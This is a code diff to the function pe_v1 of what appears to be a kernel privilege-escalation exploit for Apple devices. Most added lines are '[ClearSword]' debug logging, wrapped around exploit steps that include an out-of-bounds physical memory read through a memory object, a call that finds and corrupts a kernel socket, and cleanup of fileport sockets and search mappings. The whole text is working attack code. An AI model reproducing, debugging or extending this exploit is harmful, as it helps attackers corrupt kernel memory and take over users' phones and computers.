@@ -182,9 +182,23 @@ kern_return_t pe_v1(void) {
                 // oob_size -> 0xf00, oob_offset -> 0x100
                 kr = physical_oob_read_mo(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer);
                 if (kr == KERN_SUCCESS) {
-                    // LOG_DEBUG("Finding and corrupting socket...");
-                    if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, &target_inp_gencnt_count, false) == KERN_SUCCESS) {
+                    LOG("[ClearSword] BEFORE find_and_corrupt_socket");
+
+                    kern_return_t find_kr = find_and_corrupt_socket(
+                        memory_object,
+                        seeking_offset,
+                        read_buffer,
+                        write_buffer,
+                        target_inp_gencnt_list,
+                        &target_inp_gencnt_count,
+                        false
+                    );
+
+                    LOG("[ClearSword] AFTER find_and_corrupt_socket: %d", find_kr);
+
+                    if (find_kr == KERN_SUCCESS) {
                         success = true;
+                        LOG("[ClearSword] success = true");
                         break;
                     }
                 }
@@ -197,7 +211,9 @@ kern_return_t pe_v1(void) {
             // unless when we never find target, this would
             // help with memory pressure?
             // surface_munlock(search_mapping_address);
+            LOG("[ClearSword] BEFORE mach_port_deallocate");
             kr = mach_port_deallocate(mach_task_self(), memory_object);
+            LOG("[ClearSword] AFTER mach_port_deallocate: %d", kr);
             if (kr != KERN_SUCCESS) {
                 free(read_buffer);
                 free(write_buffer);
@@ -211,19 +227,35 @@ kern_return_t pe_v1(void) {
 
         // deallocate fileport_makeport sockets
         // at this point the target sockets are already back to being fd
+        LOG("[ClearSword] BEFORE sockets_release");
         sockets_release();
+        LOG("[ClearSword] AFTER sockets_release");
 
         // deallocate search mappings
+        LOG("[ClearSword] BEFORE search-mapping deallocation");
+
         while (search_mappings_count > 0) {
-            mach_vm_address_t search_mapping_address = search_mappings[--search_mappings_count];
-            mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
+            mach_vm_address_t search_mapping_address =
+                search_mappings[--search_mappings_count];
+
+            LOG("[ClearSword] dealloc mapping: %#llx",
+                (unsigned long long)search_mapping_address);
+
+            mach_vm_deallocate(
+                mach_task_self(),
+                search_mapping_address,
+                search_mapping_size
+            );
         }
+
+        LOG("[ClearSword] AFTER search-mapping deallocation");
 
         // if (g_ctx.is_a18_devices) {
         //     surface_munlock(wired_mapping);
         // }
 
         if (success) {
+            LOG("[ClearSword] pe_v1: returning success!");
             break;
         }
     }
